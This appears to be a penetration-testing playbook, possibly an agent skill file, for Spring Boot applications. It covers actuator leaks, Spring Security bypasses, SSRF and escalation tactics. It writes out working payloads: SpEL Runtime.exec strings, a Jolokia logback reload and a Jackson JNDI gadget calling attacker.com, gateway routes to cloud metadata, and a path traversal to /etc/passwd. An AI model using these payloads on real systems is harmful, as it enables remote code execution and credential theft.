---
name: spring-boot
description: Security testing playbook for Spring Boot covering actuator exposure, SpEL injection, deserialization, and management endpoint hardening
depends_on: []
---

# Spring Boot

Security testing for Spring Boot applications. Focus on actuator endpoint exposure (/actuator, /health, /env, /heapdump), Spring Expression Language (SpEL) injection, Java deserialization, H2 console access, and service registry exposure (Eureka, Config Server).

## Attack Surface

**Actuator Endpoints**
- `/actuator` index listing all enabled endpoints
- Info endpoints: `/health`, `/info`, `/metrics`, `/prometheus`
- Sensitive endpoints: `/env`, `/configprops`, `/beans`, `/mappings`, `/threaddump`, `/heapdump`, `/loggers`, `/jolokia`, `/sessions`
- Custom actuator paths: `/management/`, `/admin/actuator/`, context-path prefixed

**Spring Security**
- Filter chain ordering: `SecurityFilterChain` beans, `@Order` priority
- Auth: HTTP Basic, form login, OAuth2 Resource Server, JWT, SAML
- Method security: `@PreAuthorize`, `@PostAuthorize`, `@Secured`, `@RolesAllowed`
- CSRF: enabled by default for session-based auth, disabled for stateless APIs

**Data Layer**
- Spring Data JPA: `@Query` (JPQL/native), `JpaRepository`, Specifications, `@Modifying`
- JdbcTemplate: `queryForObject`, `update` with string concatenation
- Spring Data REST: auto-exposed repositories at `/api/entities`
- MyBatis: XML/annotation-based SQL with `${}` interpolation

**View Layer**
- Thymeleaf: expression language, preprocessing `__${expr}__`
- JSP/JSTL (legacy): EL injection
- REST controllers returning serialized objects (Jackson)

**Messaging & Integration**
- Spring WebSocket / STOMP: message broker, SimpMessagingTemplate
- Spring Cloud Stream: Kafka/RabbitMQ message handling
- Spring Integration: service activators, transformers, routers

**Infrastructure Services**
- Eureka (service registry): `/eureka/apps`
- Config Server: `/{app}/{profile}`, `/{app}/{profile}/{label}`
- Spring Boot Admin: `/applications`, `/instances`
- H2 Console: `/h2-console`

## High-Value Targets

- `/actuator/env` - all environment properties including encrypted secrets
- `/actuator/heapdump` - full JVM heap dump containing secrets, sessions, credentials
- `/actuator/configprops` - all configuration properties
- `/actuator/mappings` - all request mappings (URL-to-controller map)
- `/actuator/sessions` - active session IDs (when Spring Session is used)
- `/actuator/jolokia` - JMX operations via HTTP (potential RCE)
- `/actuator/gateway/routes` - Spring Cloud Gateway route definitions
- `/h2-console` - embedded database console with SQL execution
- `/swagger-ui.html`, `/swagger-ui/`, `/v3/api-docs`, `/v2/api-docs`
- `/eureka/`, `/config/`, `/admin/` (Spring Cloud services)

## Reconnaissance

**Actuator Discovery**
```
GET /actuator
GET /actuator/health
GET /actuator/info
GET /actuator/env
GET /actuator/heapdump
GET /management/health
GET /manage/health
GET /admin/actuator/health
GET /application/actuator
```

Try with and without trailing slashes, and common context paths (`/api/`, `/app/`, `/v1/`).

**Path Variations**
```
GET /actuator/env
GET /actuator/env.json
GET /actuator;/env             # Semicolon bypass for Spring Security path matching
GET /actuator%3b/env           # URL-encoded semicolon
GET /actuator/env/..           # Path traversal normalization
GET /actuator/env;.css         # Suffix bypass (request treated as static resource)
```

**Spring Boot Fingerprinting**
- Default error page: `{"timestamp":..., "status":404, "error":"Not Found", "path":"..."}`
- `X-Application-Context` header (older versions)
- Whitelabel error page styling
- `/favicon.ico` default Spring Boot leaf icon

## Key Vulnerabilities

### Actuator Endpoint Exposure

**Environment Dump (/env)**
- Exposes all properties: system env, application.yml/properties, cloud config
- Spring Boot 2.x masks sensitive values by default but masking patterns are configurable
- Properties named with `password`, `secret`, `key`, `token`, `credentials` are masked
- Bypass masking: custom property names, nested objects, non-standard naming

**Heap Dump (/heapdump)**
- Full JVM heap dump in HPROF format
- Contains: plaintext passwords, session tokens, API keys, database credentials, encryption keys
- Parse with `jhat`, Eclipse MAT, or `strings heapdump | grep -i password`
- No masking: heap contains actual runtime values regardless of config masking

**Session Hijacking (/sessions)**
- When Spring Session is active: lists session IDs with associated principals
- Attacker extracts session ID, sets it as cookie, impersonates user

**JMX via Jolokia (/jolokia)**
- Jolokia exposes JMX MBeans over HTTP
- `POST /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml` - RCE via logback JNDI
- MBean operations for class loading, thread manipulation, runtime management

**Loggers Modification (/loggers)**
- `POST /actuator/loggers/ROOT {"configuredLevel":"DEBUG"}` enables verbose logging
- Exposes sensitive data in logs; useful for chaining with log file access

**Gateway Routes (/gateway/routes)**
- Spring Cloud Gateway: view and modify routing rules
- SSRF via route injection: add route forwarding to internal services

### SpEL Injection

**Spring Expression Language**
```java
// Vulnerable: user input evaluated as SpEL
@Value("#{${user.input}}")
SpelExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(userInput).getValue();
```

**Common Injection Points**
- Spring Cloud Function: routing expression from HTTP headers
- Spring Data `@Query` with SpEL: `#{#entityName}`, `#{principal}`
- Error messages with expression evaluation
- View resolvers constructing template paths from user input

**Exploitation**
```
${T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```

### Deserialization

**Java Deserialization**
- Spring remoting endpoints: HTTP Invoker, RMI
- `Content-Type: application/x-java-serialized-object` accepted by default
- Jackson/Gson polymorphic deserialization with `@type` or `@class` fields
- Redis/Memcached session serialization

**Jackson Gadget Chains**
```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```
- Requires `enableDefaultTyping()` or `@JsonTypeInfo(use=Id.CLASS)` on the target class
- Spring Boot auto-configuration may enable default typing in certain configurations

### H2 Console

**Access**
- `/h2-console` or `/h2` when `spring.h2.console.enabled=true`
- Often enabled in development profiles, sometimes left in production
- Default credentials or embedded database with no authentication

**Exploitation**
- Execute arbitrary SQL against the embedded database
- Java functions callable from SQL: `CALL SHELLEXEC('cmd')` (custom aliases)
- `CREATE ALIAS EXEC AS 'String exec(String cmd) throws Exception { ... }'`
- Stack-based RCE via `INIT=RUNSCRIPT FROM` in JDBC URL manipulation

### Service Registry Exposure

**Eureka**
```
GET /eureka/apps          # All registered services with IPs, ports, metadata
GET /eureka/apps/{app}    # Specific service instances
```
- Internal service URLs, ports, health check endpoints
- Metadata may contain configuration, version info, feature flags
- Register malicious service instance to intercept traffic (instance injection)

**Config Server**
```
GET /{application}/{profile}
GET /{application}/{profile}/{label}
GET /{application}-{profile}.yml
GET /{application}-{profile}.properties
```
- Full application configuration including database credentials, API keys
- Path traversal: `/{app}/{profile}/..%252F..%252F..%252Fetc/passwd`
- SSRF via git backend: `spring.cloud.config.server.git.uri` manipulation

### Spring Security Bypass

**Path Matching Discrepancies**
- Ant vs MVC vs regex pattern matchers: `/admin/**` vs `/admin/` vs `/admin`
- Trailing slash sensitivity: `/admin` protected but `/admin/` not (or vice versa)
- Semicolon path parameters: `/admin;foo=bar` → Spring strips `;foo=bar`, security filter may not

**Filter Chain Gaps**
- Multiple `SecurityFilterChain` beans with overlapping patterns and different `@Order`
- Static resource paths (`/css/**`, `/js/**`, `/images/**`) matched before security filters
- Actuator endpoints on separate management port bypassing main security config

**Method-Level Gaps**
- Controller method missing `@PreAuthorize` when class-level annotation expected to cascade
- `@Secured("ROLE_ADMIN")` on one method but sibling methods unprotected
- SpEL in `@PreAuthorize` expressions with logic errors

### Spring Data REST

**Auto-Exposed Repositories**
- `@RepositoryRestResource` exposes full CRUD without explicit controller
- Default: all public repositories exported at `/api/{entities}`
- Missing `@RestResource(exported = false)` on sensitive repositories or methods
- Projection abuse: custom projections exposing internal fields

## Bypass Techniques

- Semicolon path parameters: `/actuator;bypass=1/env` treated differently by Spring and reverse proxy
- URL encoding: `%2e%2e` or double encoding for path traversal
- HTTP method override: `X-HTTP-Method-Override`, `_method` parameter
- Content-type switching: `application/xml` vs `application/json` triggering different deserializers
- Management port: actuator on port 8081 while security only covers 8080
- Case sensitivity in URL patterns

## Testing Methodology

1. **Actuator enumeration** - Probe all actuator paths with path variations and context prefixes
2. **Heapdump analysis** - Download heapdump, extract secrets with MAT or string analysis
3. **Security filter audit** - Map filter chains, test path matching bypasses (semicolons, slashes, encoding)
4. **SpEL probing** - Test user-controlled inputs that may reach expression evaluation
5. **Deserialization** - Check for Java serialization endpoints, Jackson polymorphic typing
6. **H2 console** - Test access and SQL execution capability
7. **Service registry** - Probe Eureka, Config Server for service information and configuration
8. **Spring Data REST** - Enumerate auto-exposed repositories, test projection abuse

## Corpus-Derived Attack Patterns

### JNDI Injection via Configuration Strings

Java applications accepting configuration strings that flow to JNDI lookups enable RCE. This extends beyond Log4Shell to any JNDI-aware component.
- Kafka Connect: SASL JAAS configuration accepts `com.sun.security.auth.module.JndiLoginModule` with attacker-controlled `user.provider.url=ldap://attacker.com/Exploit`
- Any Spring property that reaches `javax.naming.Context.lookup()`: datasource URLs, LDAP provider URLs, JMS connection factories
- Spring Cloud Config: properties fetched from config server that contain JNDI strings are evaluated at runtime
- Test by injecting `ldap://OAST-domain/test` or `rmi://OAST-domain/test` into configuration endpoints that accept connection strings

### Unrestricted Service Registry Access

When Eureka, Consul, or Spring Boot Admin is exposed without authentication, the impact extends beyond information disclosure to active service manipulation.
- Eureka: `POST /eureka/apps/{appName}` registers a malicious service instance -- traffic intended for the real service routes to attacker-controlled endpoint
- Eureka metadata injection: register an instance with metadata containing SSRF payloads or XSS in dashboard views
- Spring Boot Admin: `/applications` endpoint lists all connected services with their actuator URLs, health checks, and environment details -- effectively a map of the internal network
- Consul: `PUT /v1/agent/service/register` with a malicious service definition

### PostMessage Handler Exploitation in Spring Frontends

Spring applications with JavaScript frontends frequently use `postMessage` for cross-component communication. Handlers that fail to validate the message origin accept attacker-crafted messages from any window.
- Search JavaScript bundles for `addEventListener("message"` and `window.onmessage`
- For each handler: check if `event.origin` is validated before processing `event.data`
- Common exploitation: handlers that write to DOM (`innerHTML`, `document.write`), update cookies, call `eval()`, or modify `window.location` based on message data
- Spring Security's CSRF protection does not cover postMessage-based state changes

### XSSI via Cookie-Dependent JavaScript Responses

Endpoints returning `application/javascript` with content that varies based on authentication cookies leak cross-origin data. The attacker includes a `<script src="https://target/api/user.js">` tag on their page.
- Crawl all endpoints returning JavaScript or JSONP content types
- For each: compare authenticated vs unauthenticated responses -- any difference indicates cookie-dependent content
- Test: JSONP callbacks (`?callback=x`), dynamic JS config endpoints (`/config.js`, `/user/settings.js`), and API endpoints that accept `Accept: application/javascript`
- Spring MVC content negotiation may serve JSON as JavaScript when `?format=jsonp` or callback parameter is present

### Gateway Route Injection for SSRF Escalation

Spring Cloud Gateway's `/actuator/gateway/routes` endpoint, when writable, enables adding routes that forward to internal services -- converting the gateway into an SSRF proxy.
- `POST /actuator/gateway/routes/{id}` with route definition targeting internal network: `{"uri": "http://169.254.169.254", "predicates": [{"name": "Path", "args": {"pattern": "/proxy/**"}}]}`
- After adding route: `POST /actuator/gateway/refresh` to apply changes
- Access `http://gateway/proxy/latest/meta-data/` to reach cloud metadata service through the gateway
- Even read-only route exposure reveals internal service topology: IPs, ports, path prefixes, load balancer configurations

### CI/CD Token and Secret Exposure in Spring Repositories

Spring Boot projects using GitHub Actions, Jenkins, or GitLab CI may expose workflow tokens and secrets through misconfigured CI pipelines or public build artifacts.
- Check for `GITHUB_TOKEN` permissions in workflow files: `issues: write`, `id-token: write`, `contents: write` are escalation vectors if workflows trigger on untrusted input
- Spring Boot build plugins (`spring-boot-maven-plugin`, `gradle bootJar`) may embed `application.properties` with secrets in the final JAR
- `mvn dependency:tree` or Gradle dependency resolution logs in public CI output may reveal internal repository URLs
- Test: clone the repository, search for `application-prod.yml`, `bootstrap.yml`, and `.env` files in git history

### Escalating Low-Severity Findings via Deep Enumeration

When an initial finding is dismissed as low severity (information disclosure, minor path traversal), use it as a foothold for deeper enumeration rather than abandoning it.
- Path traversal returning 403 on sensitive files: enumerate alternate encodings (`..%252f`, `..%c0%af`, `..;/`) and alternate file targets
- Information disclosure from actuator: chain leaked internal URLs with SSRF, leaked credentials with direct service access
- Low-severity SpEL injection (error message reflection): escalate by testing RCE payloads, chaining with deserialization gadgets
- A single exposed actuator endpoint often implies others are accessible via path variations or management port

## Validation Requirements

- Actuator exposure: sensitive data retrieved from /env, /heapdump, /configprops, or /sessions
- Heapdump: plaintext credentials or session tokens extracted from heap dump
- SpEL injection: server-side expression evaluation confirmed (command execution or data extraction)
- Deserialization: RCE or object manipulation via serialized payload
- H2 console: SQL execution on embedded database without authorization
- Config Server: application secrets retrieved via configuration endpoint
- Path bypass: security filter circumvented via semicolons, encoding, or method override
- Spring Data REST: unauthorized CRUD on auto-exposed repository
- JNDI injection: OAST callback confirming server-side JNDI lookup from injected configuration string
- Service registry manipulation: rogue service instance registered or internal service topology extracted
